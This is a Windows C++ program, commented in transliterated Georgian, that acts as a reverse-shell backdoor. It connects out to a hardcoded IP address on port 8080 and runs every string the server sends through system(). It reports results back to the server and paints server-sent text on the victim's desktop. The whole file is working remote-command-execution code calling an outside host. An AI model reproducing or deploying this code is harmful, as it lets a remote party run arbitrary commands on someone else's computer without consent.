#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <string>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#pragma comment (lib,"WS2_32.lib")
using namespace std;

void  main()
{


	//	FreeConsole();
char *ipin;
//scanf("%s",&ipin);
int port = 8080;
string ipAddress="188.169.18.47";//="127.0.0.1";//=ipin;
cout<<endl<<"________________ 188.169.18.47 __\n";
cout<<"sheiyvane IP->: ";
	//cin>>ipAddress;
cout<<endl<<"sheiyvane PORT_N->:";
	//cin>>port;
cout<<endl<<"________________\n";
WSAData data;
WORD ver = MAKEWORD(2,2);
int wsResult = WSAStartup(ver,&data);
if(wsResult != 0)
{

	cerr<<"can't start Winsock, err "<<wsResult<<endl;
	return;
}


SOCKET sock = socket(AF_INET,SOCK_STREAM,0);
if(sock == INVALID_SOCKET)
{


	cerr <<"can't create socket,Err #"<<WSAGetLastError()<<endl;
	WSACleanup();
	return;
}

sockaddr_in hint;
hint.sin_family = AF_INET;
hint.sin_port = htons(port);
inet_pton(AF_INET,ipAddress.c_str(),&hint.sin_addr); /// ver gavigee


int connResult = connect(sock,(sockaddr*)&hint,sizeof(hint));

if(connResult == SOCKET_ERROR)
{

	cerr <<"Can't connect to server ,err "<<WSAGetLastError()<<endl;
	closesocket(sock);
	WSACleanup();
	return;

}
static bool firststart=0;
HDC hdc=GetDC(GetDesktopWindow());
char buf[4096];
string userInput;
do
{
	cout<< "> ";
//	getline(cin,userInput);
	userInput="SEIYVANE BRDZANEBA :\r\n";
	if(userInput.size()<=0)
	{
		userInput="sheitane striqoni";
	}
	if(userInput.size() > 0) ///    c_str utitebs  userInput ze misamartze rac weria anu send agzavnis orobitshi da cherez operatiulida akitxebs ororbitshi
	{
		int sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
		if(sendResult != SOCKET_ERROR)
		{
			ZeroMemory(buf,4096);
			int bytesReceived = recv(sock,buf,4096,0);
			if(bytesReceived>0)
			{

				cout<< "SERVER> " <<string(buf,0,bytesReceived)<<endl;
				
					if(buf[0]=='*')
					{


						
						  PAINTSTRUCT ps;
				   HDC hdc1 = BeginPaint(GetDesktopWindow(), &ps);

			      FillRect(hdc1, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW+1));

				    EndPaint(GetDesktopWindow(), &ps);






							InvalidateRect(GetDesktopWindow(),0,1);
							TextOut(hdc,1100,30,buf,strlen(buf));
							SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
							userInput="TEXTIS GAMOTANA CHARTULIA\n";
							sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);


					}
					if(buf[0]=='#')
					{

						for(int i=0;i<=1;i++){
						TextOut(hdc,1100,30,"                                           ",strlen("                                           "));

						}


						userInput="TEXTI WAISHALA\n";




						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
					}



				int returns =system(buf);
					
				if(returns ==-1)
				{
					userInput="brdaneba shesrulda arasworad an arasrulad \n";
					sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
					firststart=1;
				}

				if(returns ==0)
				{
					firststart=1;
					userInput=" brdzaneba ar moidzebna\n";
					sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);

				}
				else{

						

						userInput="swori brdzanebaa\n";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);

				}




			}



		}
	
	}

}while(userInput.size()>0);
 /// aq itisheba kavshiri da wyvets mushaobas orive programa
//closesocket(sock);

//WSACleanup();
}